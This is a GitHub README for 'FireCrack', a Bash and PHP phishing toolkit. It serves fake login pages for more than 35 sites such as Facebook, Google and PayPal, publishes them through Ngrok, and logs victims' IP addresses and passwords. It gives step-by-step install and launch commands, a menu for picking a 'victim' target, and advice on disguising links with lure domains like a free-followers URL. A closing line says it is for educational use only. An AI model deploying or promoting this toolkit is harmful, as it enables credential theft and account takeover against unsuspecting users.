<div align="center">

<img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=28&duration=2500&pause=1000&color=FF6B6B&center=true&vCenter=true&width=600&lines=🔥+FireCrack+Phishing+Toolkit;⚔️+Automated+Attack+Framework;💻+Built+for+Pentesters" alt="FireCrack Intro" />

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=0,2,2,5,30&height=200&section=header&text=🔥%20FireCrack%20Tool&fontSize=48&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Powerful%20CLI%20for%20Social%20Engineering&descAlignY=51&descAlign=62" />

</div>

---

## 🧨 Overview

**FireCrack** is an automated phishing toolkit that helps you deploy fake login pages for popular platforms. It includes Ngrok tunneling, IP logging, and credential capture, all from a stylish CLI.

---

## ⚙️ Features

- ✅ One-click auto-setup  
- 🧠 Target picker (35+ websites)  
- 🌐 Ngrok + localhost support  
- 🕵️ IP and credential capture  
- 🧪 Masked phishing URLs  
- 🛠️ Bash-only, portable and fast  

---

## 📦 Installation Guide

---

### 📌 Prerequisites (Termux / Linux)

Install required packages:

```bash
pkg install php curl unzip git
pkg install wget ncurses-utils proot
```

🧩 Components:
- `php` – Launch phishing pages  
- `curl`, `wget` – Download and handle URLs  
- `unzip` – Extract zipped files  
- `git` – Clone repositories  
- `proot` – Runtime layer for Termux

---

### 🔌 Ngrok Setup (Termux / ARM Linux)

Enable storage and set up Ngrok:

```bash
termux-setup-storage
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
chmod +x ngrok
./ngrok authtoken <YOUR_TOKEN>
```

🔐 Replace `<YOUR_TOKEN>` with your [Ngrok Auth Token](https://dashboard.ngrok.com/get-started/your-authtoken)

---

### 🚀 FireCrack Setup & Launch

Clone, give permission, and run the tool:

```bash
git clone https://github.com/Ayomide650/firephishing.git
cd firephishing
chmod +x firephishing.sh
./firephishing.sh
```

---

## 🕹️ Usage Guide

### 🧠 Target Selection

Choose your phishing target from the menu:

```
[::] Select An Attack For Your Victim [::]

[01] Facebook    [02] Instagram   [03] Google  
[04] Microsoft   [05] Netflix     [06] Paypal  
...  
[35] Roblox
```

---

### 🌐 Port Forwarding Options

Choose how to host your phishing page:

```
[01] Localhost — Test locally
[02] Ngrok     — Get a public link
```

---

### 🛡️ Capturing Data

View collected data:

```bash
./firephishing.sh -i   # View IPs
./firephishing.sh -c   # View Credentials
```

---

### 🔧 Customization Options

- 🎯 **Custom Port**: Run server on your chosen port  
- 🕵️‍♂️ **Masked URL**: Use links like `https://get-free-followers.com` to disguise the real URL

---

## 🖥️ Screenshots

> *(Insert screenshots here if needed — UI, credentials capture, etc.)*

---

## 🛠️ Tech Stack

| Tool   | Purpose                     |
|--------|-----------------------------|
| Bash   | Core scripting               |
| PHP    | Phishing server and pages   |
| Ngrok  | Public tunnel link          |
| Curl   | HTTP requests & downloads   |

---

## 🌐 Connect With Me

- 📬 **Telegram**: [t.me/unikruzng](https://t.me/unikruzng)  
- 💻 **GitHub**: [Ayomide650](https://github.com/Ayomide650)

---

## 📜 License

**GNU General Public License v3.0**

```text
💣 Use this tool for educational purposes only!
❌ We are not responsible for any misuse!
```

---

## 👤 Author

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=24&duration=2500&pause=800&color=E74C3C&center=true&vCenter=true&width=500&lines=🔥+Built+with+Dedication+by+Firekid" alt="Author Signature" />
</p>

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=0,2,2,5,30&height=100&section=footer" />
</p>
